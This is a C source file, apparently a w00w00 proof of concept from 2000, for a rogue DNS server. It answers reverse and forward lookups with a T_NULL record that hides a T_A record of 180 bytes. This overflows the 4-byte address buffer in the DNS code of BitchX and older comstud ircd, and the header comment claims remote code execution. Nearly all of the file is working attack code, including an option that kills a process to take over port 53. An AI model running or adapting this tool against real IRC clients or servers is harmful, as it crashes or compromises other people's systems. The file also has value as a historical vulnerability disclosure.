/*
 * helot.c - bitchx/ircd DNS overflow demonstration
 * w00w00 Security Development (WSD)
 * 12.04.2000 nimrood (nimrood@onebox.com)
 *
 * this same code i used to exploit an ircd DNS spoofing bug
 * from early '99. re-usable code is great.
 * this program is fun to play with if you're messing with DNS.
 * the packet builder is MakeDNSPkt(). this tool compiles on my
 * linux systems with no problems.
 *
 * 	Greetings :: #!w00w00, caddis, dmess0r, nocarrier, nyt,
 *                   superluck, jobe, awr, metabolis, sq, bb0y
 *
 * ----------------------------------
 * problem 1: --> generic ircd
 * current and older irc servers suffer from a common bug.
 * a pointer is not updated correctly when handling unsupported
 * RR types (eg: T_NULL). this makes the server think
 * it received a malformed packet when trying to process the next RR.
 * it's not a really serious bug, but it allows for a neat trick:
 *
 * you can embed any RR type in an unsupported RR (eg: T_NULL). these
 * embedded RR's are not checked for errors or dropped by nameservers...
 * 
 * problem 2: --> bitchx all versions, remote code excecution
 * bitchx appears to use code from older irc servers to perform dns
 * lookups. this old code suffers from a bcopy/memcpy overflow while
 * processing T_A RR's. The T_A RR data length is used in a subsequent
 * memcpy without bounds checking. the overflowed variable stores an
 * IP address, only 4 bytes long. this is similar to the I_QUERY BIND
 * overflow. bitchx dns also suffers from problem 1.
 *
 * from bitchx-1.0c17, ./source/misc.c : ar_procanswer()
 * line 2639:
 *           dlen =  (int)_getshort(cp);
 *           cp += sizeof(short);
 *           rptr->re_type = type;
 * 
 *           switch(type)
 *           {
 *           case T_A :
 *                   rptr->re_he.h_length = dlen;
 *                   if (ans == 1)
 *                           rptr->re_he.h_addrtype=(class == C_IN) ? AF_INET : AF_UNSPEC;
 *                   memcpy(&dr, cp, dlen);
 *
 * problem 3: --> comstud ircd, remote code execution
 * funny enough, while working on the bitchx overflow, i accidentally
 * connected a client using the wrong IP to a comstud ircd...it died.
 * i found comstud-1.x releases are not vulnerable. 
 * i suspect other ircd server varients will be vulnerable. i would
 * recommend upgrading to a comstud-1.x release. hybrid-ircd team fixed
 * this bug a while back with the release of hybrid-5.3p3.
 *
 * from irc2.8.21+CSr31pl2, ./source/res.c : proc_answer()
 * line 548:
 *          dlen =  (int)_getshort((u_char *)cp);
 * line 565:
 *          switch(type)
 *          {
 *          case T_A :
 *                  hp->h_length = dlen;
 *                  if (ans == 1)
 *                          hp->h_addrtype =  (class == C_IN) ? AF_INET : AF_UNSPEC;
 *                  bcopy(cp, (char *)&dr, dlen);
 *
 * there are no bad guys... just disturbed guys.
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <signal.h>
#include <netinet/in.h>
#include <arpa/nameser.h>
#include <arpa/inet.h>

/* for whatever reason, these may need to be defined */
#ifndef u_char
#define u_char unsigned char
#endif
#ifndef u_short
#define u_short unsigned short
#endif
#ifndef u_long
#define u_long unsigned long
#endif

#define DNS_PORT 53

extern int optind, optopt;
extern char *optarg;

/* used for converting query type integer to respective string */
struct qtype_list
{
	int type;
	char *name;
};
const struct qtype_list qtypelist[] =
{
	{T_A,		"A"},
	{T_NS,		"NS"},
	{T_CNAME,	"CNAME"},
	{T_SOA,		"SOA"},
	{T_PTR,		"PTR"},
	{T_HINFO,	"HINFO"},
	{T_MX,		"MX"},
	{T_ANY,		"ANY"},
	{T_NULL,	"NULL"},
	{T_WKS,		"WKS"},
	{0,		"(unknown)"}
};

void CatchSigInt(int sig)
{
	signal(SIGINT, SIG_DFL);
}

void Usage(char *prog)
{
	fprintf(stderr, "\
usage: %s [-k pid] [-t ttl] [-b ip] ip hostname\n\
  ip           ip address to answer reverse lookups for\n\
  hostname     hostname to be mapped to ip, and answer forward lookups\n\
  -k           kill this process before binding dns port\n\
  -t           cache time-to-live (seconds) for this answer (default: 900)\n\
  -b           bind the nameserver to this address (default, all addresses)\n",
	prog);
	exit(1);
}

char *ip2InAddrStr(u_long ip)
{
	static char *str;
	u_char *byte;

	if(!str) 
	{
		if((str=malloc(MAXLABEL)) == NULL)
			return(str);
	}

	/* IP should be in network order to generate a proper in-addr */	
	byte = (u_char *)&ip;
	sprintf(str, "%d.%d.%d.%d.IN-ADDR.ARPA.", byte[3], byte[2], byte[1],
		byte[0]);

	return(str);
}

u_short ExpandDName(char *comp, char *dest, u_short len)
{
        char *cp, *cp2;
        u_short num;

        cp = comp; cp2 = dest;
        if(strchr(cp, '.') && strlen(cp) < len)
        {
                strcpy(cp2, cp);
                if(*(cp2 + strlen(cp2)) != '.')
                        strcat(cp2, ".");
                return(strlen(cp2));
        }

        while((*cp) && (cp))
        {
                num = (u_char)*cp;
                if(num + (cp2 - dest) > len)
                        break;
                memcpy(cp2, ++cp, num);
                cp += num; cp2 += num;
                *(cp2++) = '.';
        }
        *cp2 = 0;
        return(cp2 - dest);
}

int CompDName(char *buf, char *dname)
{
	char *p = buf, *p1;

	while((*dname) && (dname))
	{
		if((*dname == '.') && (!*(dname + 1)))
			break;
		p1 = strchr(dname, '.');
		if(!p1)
			p1 = strchr(dname, 0);
		*(p++) = p1 - dname;
		memcpy(p, dname, p1 - dname);
		p += p1 - dname;
		dname = p1;
		if(*p1)
			dname++;
	}
	*(p++) = 0;
	return(p - buf);
}

/*
 * ProcDNSPkt()
 *
 * desc: process a packet, return query name IF it's a question
 * input: pointer to packet buffer, packet buffer length
 * output: pointer to query name string, or NULL, type of query 
 */
char *ProcDNSPkt(char *pkt, u_short pktlen, int *qtype)
{
	static char *qname;
	char *qRR;
	HEADER *dnshdr;
	int qnamelen;

	/* do we even have something to look at? */
	if(pkt == NULL || pktlen < (HFIXEDSZ + QFIXEDSZ))
		return(0);
	dnshdr = (HEADER *)pkt;

	/* check query response flag */
	if(dnshdr->qr)
		return(0);

	/* check that we have only a question in this packet */
	if(ntohs(dnshdr->qdcount) != 1 || ntohs(dnshdr->arcount) != 0 ||
		ntohs(dnshdr->nscount) != 0 || ntohs(dnshdr->arcount) != 0)
		return(0);

	if(!qname)
	{
		if((qname = malloc(MAXDNAME)) == 0)
		{
			fprintf(stderr, "no memory for qname\n");
			return(0);
		}
	}
	qnamelen = ExpandDName(pkt+HFIXEDSZ, qname, MAXDNAME);
	if(qnamelen == 0)
		return(NULL);

	/* extract the query type received and fill in qtype */
	qRR = pkt + HFIXEDSZ + strlen(pkt + HFIXEDSZ) + 1;
	GETSHORT(qnamelen, qRR); 
	*qtype = qnamelen;
	return(qname);
}

/*
 * QType2Str()
 *
 * desc: convert query type integer to a string representation
 * input: query type
 * output: pointer to string of query type
 */
char *QType2Str(int qtype)
{
	int i = 0;

	while(qtypelist[i].type && qtypelist[i].type != qtype)
		i++;
	return(qtypelist[i].name);
}

/*
 * MakeDNSPkt()
 *
 * desc: make a dns answer packet for a question
 * input: pointer to original query packet to build answer for, pointer to
 *	answer packet buffer, buffer length, answer data, additional data,
 *	time-to-live 
 * output: returns size of answer packet, or NULL
 */
u_short MakeDNSPkt(char *qpkt, char *apkt, u_short alen, char *answer,
	char *additional, u_long ttl)
{
	u_short sz, offset; 
	int qtype;
	HEADER *qhdr, *ahdr;
	char *query, *aquery, *answerRR;
	char qname[MAXDNAME]; /* domain name label scratch pad */
	char *cp, *cp2;

	/* do some checks */
	if(qpkt == NULL || apkt == NULL || answer == NULL || additional == NULL)
		return(0);

	/* setup pointers */
	qhdr = (HEADER *)qpkt; ahdr = (HEADER *)apkt;
	query = qpkt + HFIXEDSZ; aquery = apkt + HFIXEDSZ;

	/* answer packet dns header, we use the query packet's hdr */
	if(alen < HFIXEDSZ)
		return(0);
	memcpy(ahdr, qhdr, HFIXEDSZ);
	ahdr->qr = 1; /* query response */
	ahdr->aa = 1; /* authoratative answer */
	ahdr->rcode = NOERROR;

	/* copy original query info to answer packet */
	memcpy(aquery, query, (strlen(query) + QFIXEDSZ + 1));
	aquery += strlen(query) + 1;
	GETSHORT(qtype, aquery);
	answerRR = aquery + INT16SZ;

	/* build the answer RR's based on query type */
	sz = CompDName(qname, answer);

	switch(qtype)
	{
		case T_PTR:
			/* answer the original question. this RR's data 
			 * comes from the "hostname" cmdline option.
			 * this is a normal and valid resource record
			 */
			PUTSHORT((HFIXEDSZ | 0xc000), answerRR);
			PUTSHORT(T_PTR, answerRR);
			PUTSHORT(C_IN, answerRR);
			PUTLONG(ttl, answerRR);
			PUTSHORT(sz, answerRR);
			memcpy(answerRR, qname, sz);
			offset = answerRR - apkt; /* offset used for compression */
			answerRR += sz;

			/* this RR, T_NULL demonstrates problem 1. this RR has
			 * an embedded T_A record in it's data field
			 */
			PUTSHORT((HFIXEDSZ | 0xc000), answerRR);
			PUTSHORT(T_NULL, answerRR);
			PUTSHORT(C_IN, answerRR);
			PUTLONG(ttl, answerRR);
			cp = answerRR; /* pointer to T_NULL RR's data lengh */
			PUTSHORT(0, answerRR);
			cp2 = answerRR;	/* pointer to start of embedded T_A RR */
				
			/* T_A record is actually embedded in the T_NULL record.
			 * bitchx/ircd will read into this T_A record on the next loop.
			 * this lets us get around restrictions in BIND on T_A RR's
			 *
			 * this RR causes problems 2 & 3 -- the overflow
			 */
			PUTSHORT((offset | 0xc000), answerRR);
			PUTSHORT(T_A, answerRR);
			PUTSHORT(C_IN, answerRR);	
			PUTLONG(ttl, answerRR);
			PUTSHORT(180, answerRR); /* overflow with 180 N's */
			memset(answerRR, 'N', 180);
			answerRR += 180;

			/* compute size of embedded T_A & update T_NULL's dlength */
			PUTSHORT((answerRR - cp2), cp);

			/* this record is needed to continue the dns loop in
			 * bitchx/ircd. it can be any RR, i used T_NULL
			 */ 
                        PUTSHORT((HFIXEDSZ | 0xc000), answerRR);
                        PUTSHORT(T_NULL, answerRR);
                        PUTSHORT(C_IN, answerRR);
                        PUTLONG(ttl, answerRR);
                        PUTSHORT(0, answerRR);

			ahdr->ancount = htons(3);
			ahdr->nscount = htons(0);
			ahdr->arcount = htons(0);
			break;

		case T_A:
			/* BIND deems T_A records with data length <> 4 bytes
			 * to be malformed. so we must embed the RR.
			 */
			PUTSHORT((HFIXEDSZ | 0xc000), answerRR);
			PUTSHORT(T_NULL, answerRR);
			PUTSHORT(C_IN, answerRR);
			PUTLONG(ttl, answerRR);
			cp = answerRR;
			PUTSHORT(0, answerRR);
			cp2 = answerRR;

			/* problem 2 & 3 demonstrated with a T_A query */
			PUTSHORT((HFIXEDSZ | 0xc000), answerRR);
			PUTSHORT(T_A, answerRR);
			PUTSHORT(C_IN, answerRR);
			PUTLONG(ttl, answerRR);
			PUTSHORT(180, answerRR); 
			memset(answerRR, 'A', 180);
			answerRR += 180;

			/* fix up the size of the T_NULL */
			PUTSHORT((answerRR - cp2), cp);

			/* another T_NULL ... */
                        PUTSHORT((HFIXEDSZ | 0xc000), answerRR);
                        PUTSHORT(T_NULL, answerRR);
                        PUTSHORT(C_IN, answerRR);
                        PUTLONG(ttl, answerRR);
                        PUTSHORT(0, answerRR);

			ahdr->ancount = htons(2);
                        ahdr->nscount = htons(0);
                        ahdr->arcount = htons(0);
                        break;

		default:
			fprintf(stderr, "\ntype %d query not supported\n",
				qtype);
			return(0);
	}

	return(answerRR - (char *)ahdr);
}

/*
 * SocketBind()
 *
 * desc: get's a udp socket and binds it to dns port 53 and an IP address
 * input: pid to kill before bind, struct sockaddr initialize, IP address
 * output: socket descriptor, or -1 on error
 */
int SocketBind(u_short pid, struct sockaddr_in *sa, u_long listen_ip)
{
	int sd, sockopt, sockoptlen;

	if((sd = socket(AF_INET, SOCK_DGRAM, 0)) < 0)
	{
		perror("can't get a udp socket");
		return(sd);
	}

	
	if(pid)
	{
		fprintf(stderr, "killing pid %u...", pid);
		if(kill(pid, SIGKILL) < 0)
		{
			perror("can't kill process");
			return(-1);
		}
		fprintf(stderr, "killed.\n");
	}

	sa->sin_family = AF_INET;
	sa->sin_port = htons(DNS_PORT);
	sa->sin_addr.s_addr = listen_ip;
	sockopt = 1; sockoptlen = 4;
	setsockopt(sd, SOL_SOCKET, SO_REUSEADDR, (char *)&sockopt, sockoptlen);

	if(bind(sd, (struct sockaddr *)sa, sizeof(struct sockaddr)) < 0)
	{
		perror("can't bind dns port 53");
		return(-1);
	}

	fprintf(stderr, "listening on %s...\n", inet_ntoa(sa->sin_addr));
	return(sd);
}

/*
 * SendPkt()
 *
 * desc: send dns answer packet into the great unknown
 * input: socket, received packet, answer string, additional answer, ttl,
 *	struct sockaddr from, from length
 * output: returns # bytes sent, < 0 on error
 */
int SendPkt(int sd, char *rbuf, char *answer, char *additional, u_long ttl,
	struct sockaddr_in *to, int tolen)
{
	char sbuf[PACKETSZ];
	int slen, sent;

	slen = MakeDNSPkt(rbuf, sbuf, PACKETSZ, answer, additional, ttl);
	if(!slen)
	{
		fprintf(stderr, "error building answer packet\n");
		return(-1);
	}
	if((sent = sendto(sd, sbuf, slen, 0, (struct sockaddr *)to, tolen)) < 0)
	{
		perror("sending answer packet");
		return(sent);
	}
	return(sent);
}
	
/*
 * main()
 */
int main(int argc, char *argv[])
{
	int sd, opt, rlen, fromlen, sent, qtype;
	u_short killpid = 0;
	u_long ttl = (15 * 60), ip, bind_ip = 0;
	char rbuf[PACKETSZ];
	char *qname = NULL,  *inaddrstr = NULL, *hostname = NULL;
	struct sockaddr_in named, from;
	fd_set dns;

	fprintf(stderr,"\
helot.c - bitchx/ircd DNS overflow demonstration
12.04.2000 nimrood (nimrood@onebox.com)
w00w00 Security Development (WSD)\n\n");

	while((opt = getopt(argc, argv, "k:t:b:")) != -1)
	{
		switch(opt)
		{
			case 'k':
				killpid = atoi(optarg);
				break;
			case 't':
				ttl = strtoul(optarg, NULL, 0);
				break;
			case 'b':
				if((bind_ip = inet_addr(optarg)) == -1)
				{
					fprintf(stderr, 
					"%s is not an ip address!\n", optarg);
					exit(-1);
				}
				break;
			case '?':
				Usage(argv[0]);
				/* NOT REACHED */
			default:
				fprintf(stderr, "getopt() error doh!\n");
				exit(-1);
		}
	}

	/* get ip address and hostname to use for answers */
	if((argc - optind) != 2)
		Usage(argv[0]);

	if((ip = inet_addr(argv[optind])) == -1)
	{
		fprintf(stderr, "%s not an ip address!\n", argv[optind]);
		exit(-1);
	}
	
        /* get a socket and bind it to the dns port 53 */
        if((sd = SocketBind(killpid, &named, bind_ip)) < 0)
        {
                fprintf(stderr, "error setting up network!\n");
                goto exit_helot;
        }

	if((hostname = malloc(strlen(argv[++optind]) + 2)) == NULL)
	{
		fprintf(stderr, "can't get memory for hostname!\n");
		goto exit_helot;
	}
	strcpy(hostname, argv[optind]);
	if(*(hostname + strlen(hostname)) != '.')
		strcat(hostname, ".");

	if((inaddrstr = ip2InAddrStr(ip)) == NULL)
	{
		fprintf(stderr, "can't get memory for in-addr string!\n");
		goto exit_helot;
	}

	/* catch ctrl-c so i can free used memory */
	signal(SIGINT, CatchSigInt);

	while(1)
	{
		FD_ZERO(&dns);
		FD_SET(sd, &dns);
		if(select((sd + 1), &dns, NULL, NULL, NULL) < 0)
		{
			perror("error on listening socket");
			break;
		}

		if(FD_ISSET(sd, &dns))
		{
			fromlen = sizeof(from);
			if((rlen = recvfrom(sd, rbuf, PACKETSZ, 0, 
				(struct sockaddr *)&from, &fromlen)) < 0)
			{
				perror("error reading from socket");
				break;
			}

			if(!rlen)
			{
				fprintf(stderr, "from %s, empty packet\n",
					inet_ntoa(from.sin_addr));
				continue;
			}

			if((qname = ProcDNSPkt(rbuf, rlen, &qtype)) == NULL)
			{
				fprintf(stderr, "from %s, no query\n",
					inet_ntoa(from.sin_addr));
				continue;
			}
			
			fprintf(stderr, "from %s, %s/%s, query", inet_ntoa(from.sin_addr),
				qname, QType2Str(qtype));

			if(strcasecmp(qname, inaddrstr) == 0 && qtype == T_PTR)
			{
				sent = SendPkt(sd, rbuf, hostname, (char *)&ip,
					ttl, &from, fromlen);
				if(sent <= 0)
				{
					fprintf(stderr, "no answer sent!!\n");
					break;
				}

				fprintf(stderr, " answered.\n");
				continue;
			}

			if(strcasecmp(qname, hostname) == 0 && qtype == T_A)
			{
				sent = SendPkt(sd, rbuf, hostname, (char *)&ip, 
					ttl, &from, fromlen);
				if(sent <= 0)
				{
					fprintf(stderr, "no answer sent!!\n");
					break;
				}

				fprintf(stderr, " answered\n");
			}
		}
		fprintf(stderr,"\n");
	}

exit_helot:
	fprintf(stderr, "\ncleaning up...\n");
	free(qname); free(hostname); free(inaddrstr); close(sd);
	exit(-1);
}
